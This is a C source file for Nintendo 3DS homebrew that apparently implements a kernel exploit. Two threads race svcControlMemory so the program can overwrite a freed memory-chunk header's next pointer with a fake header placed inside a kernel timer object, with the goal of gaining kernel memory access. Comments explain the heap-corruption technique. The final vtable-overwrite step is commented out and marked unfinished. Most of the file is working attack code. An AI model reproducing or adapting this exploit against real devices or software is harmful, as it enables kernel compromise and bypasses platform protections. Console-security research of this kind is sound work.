#include <3ds.h>

#include <stdio.h>
#include <stdlib.h>

#define PAGE_SIZE 0x1000

typedef struct __attribute__((packed)) {
    void** vtable;
    u32 refCount;
    u32 syncedThreads;
    void* firstThreadNode;
    void* lastThreadNode;
    void* timerInterruptVtable;
    void* interruptObject;
    s64 suspendTime;
    u8 timerEnabled;
    u8 resetType;
    u16 unused;
    s64 interval;
    s64 initial;
    void* owner;
} KTimer;

typedef struct {
    u32 size;
    void* next;
    void* prev;
} MemChunkHdr;

typedef struct {
    u32 addr;
    u32 size;
    Result result;
} AllocateData;

extern u32 __ctru_heap;
extern u32 __ctru_heap_size;

// Thread function to slow down svcControlMemory execution.
static void delay_thread(void* arg) {
    AllocateData* data = (AllocateData*) arg;

    // Slow down thread execution until the control operation has completed.
    while(data->result == -1) {
        svcSleepThread(10000);
    }
}

// Thread function to allocate memory pages.
static void allocate_thread(void* arg) {
    AllocateData* data = (AllocateData*) arg;

    // Allocate the requested pages.
    data->result = svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
}

// Maps pages with block headers present.
static bool begin_map_pages(AllocateData* data) {
    // Create thread to slow down svcControlMemory execution.
    Thread delayThread = threadCreate(delay_thread, data, 0x4000, 0x18, 1, true);
    if(delayThread == NULL) {
        return false;
    }

    // Create thread to allocate pages.
    Thread allocateThread = threadCreate(allocate_thread, data, 0x4000, 0x3F, 1, true);
    if(allocateThread == NULL) {
        // Terminate the delay thread on failure.
        data->result = 0;
        return false;
    }

    return true;
}

// Waits for a raw page to be mapped.
static void wait_raw_mapped(u32 addr) {
    Handle arbiter = __sync_get_arbiter();

    // Use svcArbitrateAddress to detect when the memory page has been mapped.
    while((u32) svcArbitrateAddress(arbiter, addr, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
}

// Creates a timer and outputs its kernel object address (at ref count, not vtable pointer) from r2.
static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset_type, u32* kaddr) {
    asm volatile(
    "str r0, [sp, #-4]!\n"
    "str r2, [sp, #-4]!\n"
    "svc 0x1A\n"
    "ldr r3, [sp], #4\n"
    "str r2, [r3]\n"
    "ldr r2, [sp], #4\n"
    "str r1, [r2]\n"
    "bx lr"
    );
}

// Executes exploit.
void do_hax() {
    printf("Setting up...\n");

    aptOpenSession();
    if(R_FAILED(APT_SetAppCpuTimeLimit(30))) {
        printf("Failed to allow threads on core 1.\n");
        return;
    }

    aptCloseSession();

    AllocateData* data = (AllocateData*) malloc(sizeof(AllocateData));
    if(data == NULL) {
        printf("Failed to create allocate data.\n");
        goto cleanup;
    }

    data->addr = __ctru_heap + __ctru_heap_size;
    data->size = PAGE_SIZE * 2;
    data->result = -1;

    // Isolate a single page between others to ensure using the next pointer.
    u32 isolatedPage = 0;
    if(R_FAILED(svcControlMemory(&isolatedPage, data->addr + data->size, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE)))) {
        printf("Failed to allocate isolated page.\n");
        goto cleanup;
    }

    u32 isolatingPage = 0;
    if(R_FAILED(svcControlMemory(&isolatingPage, data->addr + data->size + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE)))) {
        printf("Failed to allocate isolating page.\n");
        goto cleanup;
    }

    if(R_FAILED(svcControlMemory(&isolatedPage, isolatedPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE))) {
        printf("Failed to free isolated page.\n");
        goto cleanup;
    }

    isolatedPage = 0;

    // Create a timer in order to use part of its data as a fake memory block header.
    // Prev does not matter, as any verification happens prior to the overwrite.
    // However, next must be 0, as it does not use size to check when allocation is finished.
    // If next is not 0, it will continue to whatever is pointed to by it.
    // Even if this eventually reaches an end, it will continue decrementing the remaining size value.
    // This will roll over, and panic when it thinks that there is more memory to allocate than was available.
    Handle timer;
    u32 timerAddr;
    if(R_FAILED(svcCreateTimerKAddr(&timer, 0, &timerAddr))) {
        printf("Failed to create timer.\n");
        goto cleanup;
    }

    // Retrieve a kernel pointer to the timer object and create a pointer to our fake header.
    // refCount = size, syncedThreads = next, firstThreadNode = prev
    KTimer* timerObj = (KTimer*) (timerAddr - 4);
    MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->refCount;

    // Allocate a buffer to back up the kernel page before it is cleared by the allocation code.
    //void* backup = malloc(PAGE_SIZE);

    printf("Mapping pages for overwrite...\n");

    if(!begin_map_pages(data)) {
        printf("Failed to create memory map threads.\n");
        goto cleanup;
    }

    // Overwrite the header "next" pointer to our crafted MemChunkHdr within the timer.
    wait_raw_mapped(data->addr);
    ((MemChunkHdr*) data->addr)->next = fakeHdr;

    // Back up the kernel page before it is cleared.
    wait_raw_mapped(data->addr + PAGE_SIZE);
    //memcpy(backup, (void*) (memAddr + PAGE_SIZE), PAGE_SIZE);

    printf("Post-overwrite control result: 0x%08X\n", (int) data->result);

    // Wait for memory mapping to complete.
    while(data->result == -1) {
        svcSleepThread(1000000);
    }

    // Restore the kernel page backup.
    //memcpy((void*) (memAddr + PAGE_SIZE), backup, PAGE_SIZE);

    if(R_FAILED(data->result)) {
        printf("Failed to map memory.\n");
        goto cleanup;
    }

    // Overwrite the timer's vtable with our own.
    // TODO: This needs to be a kernel virtual address.
    //KTimer* mappedTimerObj = (KTimer*) (memAddr + PAGE_SIZE + ((u32) timerObj & 0xFFF));
    //mappedTimerObj->vtable = vtable;

cleanup:
    printf("Cleaning up...\n");

    if(data != NULL && data->result == 0) {
        svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_FREE, MEMPERM_DONTCARE);
    }

    if(isolatedPage != 0) {
        svcControlMemory(&isolatedPage, isolatedPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
        isolatedPage = 0;
    }

    if(isolatingPage != 0) {
        svcControlMemory(&isolatingPage, isolatingPage, 0, PAGE_SIZE, MEMOP_FREE, MEMPERM_DONTCARE);
        isolatingPage = 0;
    }

    if(data != NULL) {
        free(data);
    }

    if(timer != 0) {
        svcCloseHandle(timer);
    }
}

int main(int argc, char **argv) {
    gfxInitDefault();
    consoleInit(GFX_TOP, NULL);

    do_hax();

    printf("Press START to exit.\n");

    while(aptMainLoop()) {
        hidScanInput();
        if(hidKeysDown() & KEY_START) {
            break;
        }

        gfxFlushBuffers();
        gfxSwapBuffers();
        gspWaitForVBlank();
    }

    gfxExit();
    return 0;
}
